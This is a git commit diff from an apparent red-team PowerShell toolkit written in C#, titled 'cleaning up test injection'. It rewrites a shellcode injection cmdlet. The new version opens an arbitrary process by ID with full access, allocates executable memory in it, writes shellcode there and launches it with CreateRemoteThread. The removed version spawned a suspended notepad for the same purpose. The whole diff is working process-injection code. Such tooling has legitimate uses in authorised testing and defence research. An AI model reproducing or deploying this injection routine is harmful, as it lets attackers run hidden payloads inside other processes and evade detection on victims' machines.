e09f2a87dc5419ba836d8caef3a19e2ae1378180
unknown <calonso@attact.io>
2021-08-16 23:16:15 -0400

    cleaning up test injection

--- TurtleToolKit/TurtleToolKit/Execution/InvokeInjectionTest.cs
+++ TurtleToolKit/TurtleToolKit/Execution/InvokeInjectionTest.cs
@@ -6,7 +6,6 @@ using TurtleToolKitManaged;
 namespace TurtleToolKit
 {
     [Cmdlet(VerbsLifecycle.Invoke, "InjectionTest")] // <- seeting cmdlet name and verbs
-    //[OutputType(typeof(ShellCodeEncryptedOutput))]       // <-- setting output type
     [Alias("TEST")] //<- cmdlet alias
     public class InvokeInjectionTest : Cmdlet
     {
@@ -38,29 +37,19 @@ namespace TurtleToolKit
 
         private bool ExecuteClassicInjection(byte[] shellcode, int processId)
         {
-            // to do add error better error checking
+            // to do add better error checking
             try
             {
-
-                Win32.STARTUPINFO si = new Win32.STARTUPINFO();
-                Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();
-                string path = "C:\\windows\\system32\\notepad.exe";
-                bool res = Win32.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
-                Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
-                uint tmp = 0;
-                IntPtr hProcess = pi.hProcess; // process handle
-                Console.WriteLine(pi.dwProcessId);
                 int payloadSize = shellcode.Length;
                 IntPtr outSize;
-                //IntPtr hProcessTwo = Win32.OpenProcess(0x001F0FFF, false, pi.dwProcessId);
-                IntPtr addr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero,(uint)shellcode.Length, 0x3000, 0x40);
-                if (!Win32.WriteProcessMemory(hProcess, addr, shellcode, payloadSize, out outSize))
+                IntPtr hProcessTwo = Win32.OpenProcess(0x001F0FFF, false, processId);
+                IntPtr addr = Win32.VirtualAllocEx(hProcessTwo, IntPtr.Zero,(uint)shellcode.Length, 0x3000, 0x40);
+                if (!Win32.WriteProcessMemory(hProcessTwo, addr, shellcode, payloadSize, out outSize))
                 {
                     Console.WriteLine("failed to write process memory {0}",Marshal.GetLastWin32Error());
                     return false;
                 }
-                IntPtr hThread = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-                Win32.ResumeThread(pi.Thread);
+                IntPtr hThread = Win32.CreateRemoteThread(hProcessTwo, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                 return true;
             }
             catch (Exception e)
